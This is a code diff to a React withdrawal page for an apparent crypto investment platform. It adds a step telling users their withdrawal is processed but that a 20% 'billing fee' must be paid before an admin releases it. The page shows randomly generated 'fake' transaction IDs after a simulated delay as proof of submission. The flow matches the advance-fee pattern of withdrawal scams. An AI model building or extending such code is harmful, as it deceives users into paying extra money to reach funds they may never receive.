@@ -1,9 +1,10 @@
 // src/pages/Withdraw.js
 import React, { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
-import { FiArrowLeft, FiCheck, FiInfo, FiClock, FiDollarSign, FiCopy } from 'react-icons/fi';
-import { submitWithdrawal, verifyWithdrawalPin } from '../services/withdrawalAPI';
+import { FiArrowLeft, FiCheck, FiInfo, FiClock, FiDollarSign, FiCopy, FiAlertTriangle, FiX } from 'react-icons/fi';
+import { submitWithdrawal, verifyWithdrawalPin, getBillingStatus } from '../services/withdrawalAPI';
 import WithdrawalHistory from '../components/WithdrawalHistory';
+import BillingPaymentForm from '../components/BillingPaymentForm';
 import { getUserWithdrawals } from '../services/userWithdrawalAPI';
 import { useUser } from '../contexts/UserContext';
 import { useUserDataRefresh } from '../contexts/UserDataRefreshContext';
@@ -26,6 +27,9 @@ const Withdraw = () => {
   const [pinError, setPinError] = useState('');
   const [currency, setCurrency] = useState('USDT');
   const [liveRate, setLiveRate] = useState(null);
+  const [showBillingModal, setShowBillingModal] = useState(false);
+  const [billingData, setBillingData] = useState(null);
+  const [withdrawalResponse, setWithdrawalResponse] = useState(null);
   const navigate = useNavigate();
 
   // Available networks and currencies
@@ -35,6 +39,17 @@ const Withdraw = () => {
     { id: 'TRC20', name: 'TRC20 (Tron)', currencies: ['USDT'] },
     { id: 'BEP20', name: 'BEP20 (Binance Smart Chain)', currencies: ['USDT', 'BNB'] },
   ];
+
+  // Fetch billing status
+  const fetchBillingData = async () => {
+    try {
+      const response = await getBillingStatus();
+      setBillingData(response);
+    } catch (err) {
+      console.error('Failed to fetch billing status:', err);
+      setBillingData(null);
+    }
+  };
 
   // Fetch user balances
   useEffect(() => {
@@ -67,6 +82,7 @@ const Withdraw = () => {
     };
 
     fetchBalances();
+    fetchBillingData();
   }, []);
 
   // In your withdrawal form (step 1), add a currency selector if needed, or set currency based on network selection
@@ -123,17 +139,30 @@ const Withdraw = () => {
         address: walletAddress,
         pin
       });
-      if (!result || !result.cryptoCurrency || !result.cryptoAmount || !result.conversionRate) {
-        setPinError('Withdrawal failed. Please try again.');
-        setIsSubmitting(false);
-        return;
+      
+      // Store the withdrawal response for billing display
+      setWithdrawalResponse(result);
+      
+      // Check if billing is required
+      if (result.billingRequired && result.billingFee > 0) {
+        // Show billing information and set step to billing
+        setStep(4); // New step for billing
+        await fetchBillingData(); // Refresh billing data
+      } else {
+        // Original flow for non-billing withdrawals
+        if (!result || !result.cryptoCurrency || !result.cryptoAmount || !result.conversionRate) {
+          setPinError('Withdrawal failed. Please try again.');
+          setIsSubmitting(false);
+          return;
+        }
+        // Simulate server response delay
+        await new Promise(resolve => setTimeout(resolve, 1500));
+        // Generate fake transaction ID
+        const fakeId = `WD-${Math.random().toString(36).substr(2, 10).toUpperCase()}`;
+        setTransactionId(fakeId);
+        setStep(3);
       }
-      // Simulate server response delay
-      await new Promise(resolve => setTimeout(resolve, 1500));
-      // Generate fake transaction ID
-      const fakeId = `WD-${Math.random().toString(36).substr(2, 10).toUpperCase()}`;
-      setTransactionId(fakeId);
-      setStep(3);
+      
       refreshUserData(); // Trigger global refresh
     } catch (error) {
       setPinError(error?.msg || 'Withdrawal error.');
@@ -146,7 +175,17 @@ const Withdraw = () => {
     setAmount('');
     setWalletAddress('');
     setTransactionId('');
+    setWithdrawalResponse(null);
     setStep(1);
+  };
+
+  const handleBillingPaymentSuccess = async (response) => {
+    // Generate fake transaction ID for the paid withdrawal
+    const fakeId = `WD-${Math.random().toString(36).substr(2, 10).toUpperCase()}`;
+    setTransactionId(fakeId);
+    setStep(3); // Move to success step
+    await fetchBillingData(); // Refresh billing data
+    refreshUserData(); // Trigger global refresh
   };
 
   const copyToClipboard = (text) => {
@@ -232,21 +271,22 @@ const Withdraw = () => {
           {step === 1 && 'Withdraw Funds'}
           {step === 2 && 'Confirm Withdrawal'}
           {step === 3 && 'Withdrawal Submitted'}
+          {step === 4 && 'Billing Payment Required'}
         </h1>
       </div>
 
       {/* Step Indicator */}
-      <div className="flex justify-between items-center mb-8 max-w-md mx-auto">
-        {[1, 2, 3].map((stepNumber) => (
+      <div className="flex justify-between items-center mb-8 max-w-lg mx-auto">
+        {[1, 2, step === 4 ? 4 : 3].map((stepNumber, index) => (
           <React.Fragment key={stepNumber}>
             <div
               className={`flex items-center justify-center w-10 h-10 rounded-full ${
                 step >= stepNumber ? 'bg-gold text-black' : 'bg-gray-800 text-gray-400'
               } font-medium`}
             >
-              {stepNumber}
+              {stepNumber === 4 ? '$' : stepNumber}
             </div>
-            {stepNumber < 3 && (
+            {index < (step === 4 ? 2 : 1) && (
               <div
                 className={`flex-1 h-1 mx-2 ${
                   step > stepNumber ? 'bg-gold' : 'bg-gray-800'
@@ -474,6 +514,84 @@ const Withdraw = () => {
         </div>
       )}
 
+      {/* Step 4: Billing Payment */}
+      {step === 4 && withdrawalResponse && (
+        <div className="glassmorphic p-6 rounded-xl max-w-2xl mx-auto">
+          <div className="mb-6">
+            <div className="flex items-center justify-center mb-4">
+              <div className="bg-yellow-500 bg-opacity-20 p-3 rounded-full text-yellow-500">
+                <FiAlertTriangle size={32} />
+              </div>
+            </div>
+            <h3 className="text-xl font-bold text-center mb-4">Billing Payment Required</h3>
+            <p className="text-gray-400 text-center mb-6">
+              Your withdrawal has been processed but requires a billing fee payment to complete.
+            </p>
+          </div>
+
+          <div className="bg-gray-800 bg-opacity-50 p-4 rounded-lg mb-6">
+            <h4 className="font-bold mb-3">Withdrawal Details</h4>
+            <div className="space-y-2 text-sm">
+              <div className="flex justify-between">
+                <span className="text-gray-400">Withdrawal Amount:</span>
+                <span>${amount} USD</span>
+              </div>
+              <div className="flex justify-between">
+                <span className="text-gray-400">Network:</span>
+                <span>{networks.find(n => n.id === selectedNetwork)?.name}</span>
+              </div>
+              <div className="flex justify-between">
+                <span className="text-gray-400">Destination:</span>
+                <span className="font-mono text-xs break-all">{walletAddress}</span>
+              </div>
+              <div className="flex justify-between border-t border-gray-700 pt-2 mt-2">
+                <span className="text-gray-400">Billing Fee (20%):</span>
+                <span className="text-red-400 font-bold">${withdrawalResponse.billingFee?.toFixed(2)}</span>
+              </div>
+            </div>
+          </div>
+
+          <div className="bg-blue-500 bg-opacity-10 border border-blue-500 border-opacity-30 p-4 rounded-lg mb-6">
+            <div className="flex items-start">
+              <FiInfo className="text-blue-400 mt-1 mr-3 flex-shrink-0" />
+              <div className="text-sm text-blue-300">
+                <p className="mb-2">
+                  <strong>Why is billing required?</strong>
+                </p>
+                <p>
+                  A 20% billing fee is required for all withdrawals. This fee must be paid from your available balance 
+                  before your withdrawal can be processed by our admin team.
+                </p>
+              </div>
+            </div>
+          </div>
+
+          {billingData && billingData.pendingBillingWithdrawals?.length > 0 && (
+            <div className="mb-6">
+              <BillingPaymentForm 
+                onPaymentSuccess={handleBillingPaymentSuccess}
+                onClose={() => {}} // No close button in this context
+              />
+            </div>
+          )}
+
+          <div className="flex space-x-4">
+            <button
+              onClick={() => navigate('/portfolio')}
+              className="flex-1 py-3 rounded-lg font-bold border border-gray-600 hover:bg-gray-800 transition"
+            >
+              Go to Portfolio
+            </button>
+            <button
+              onClick={() => setShowBillingModal(true)}
+              className="flex-1 py-3 rounded-lg font-bold bg-gold text-black hover:bg-yellow-600 transition"
+            >
+              Pay Billing Fee
+            </button>
+          </div>
+        </div>
+      )}
+
       {/* Step 3: Success */}
       {step === 3 && (
         <div className="glassmorphic p-6 rounded-xl text-center">
@@ -518,6 +636,33 @@ const Withdraw = () => {
         <h2 className="text-xl font-bold mb-4">Withdrawal History</h2>
         <WithdrawalHistory withdrawals={withdrawals} />
       </div>
+
+      {/* Billing Payment Modal */}
+      {showBillingModal && (
+        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
+          <div className="bg-gray-900 rounded-xl max-w-2xl w-full max-h-[90vh] overflow-y-auto">
+            <div className="p-6">
+              <div className="flex justify-between items-center mb-6">
+                <h2 className="text-xl font-bold">Billing Payment</h2>
+                <button
+                  onClick={() => setShowBillingModal(false)}
+                  className="text-gray-400 hover:text-white transition"
+                >
+                  <FiX size={24} />
+                </button>
+              </div>
+              
+              <BillingPaymentForm 
+                onPaymentSuccess={(data) => {
+                  handleBillingPaymentSuccess(data);
+                  setShowBillingModal(false);
+                }}
+                onClose={() => setShowBillingModal(false)}
+              />
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 }
